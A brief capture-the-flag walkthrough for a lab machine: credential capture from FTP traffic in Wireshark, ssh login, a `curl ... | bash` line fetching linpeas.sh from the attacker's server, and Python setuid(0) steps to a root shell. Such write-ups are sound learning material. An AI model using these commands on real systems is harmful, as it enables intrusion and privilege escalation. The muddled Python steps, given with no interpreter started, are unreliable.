**Objective**
Privilege escalation by accessing account belonging to nathan to find API key.

**Solving The Box**
- Open lab webpage by entering target machine IP address into own web browser address bar.
- Find and open *network status* menu. Download network status file. Open in *wireshark* to see logs of file transfer protocol traffic. Find password for user account nathan.
- Login via ssh command `ssh nathan@<IP address>`.
- Download linpeas.sh using Google search. Go to folder with linpeas.sh., then open terminal there. 
- In the terminal, enter command `sudo python3 -m http.server` to start a server to send linpeas.sh to the target machine.
- Return to terminal with nathan logged in. Enter command `curl http://<IP address>/linpeas.sh | bash`
- If it does not work, manually execute linpeas.sh by running command `./linpeas.sh`. 
- For manual execution, first receive access to root using commands:
		`cd /tmp` *this is to enter tmp folder*
		`import os` 
		`os.setuid(0)` *here 0 corresponds to root user id*
		`os.system("/bin/bash")`
- With root access, enter *root* directory then open .txt file containing API key.

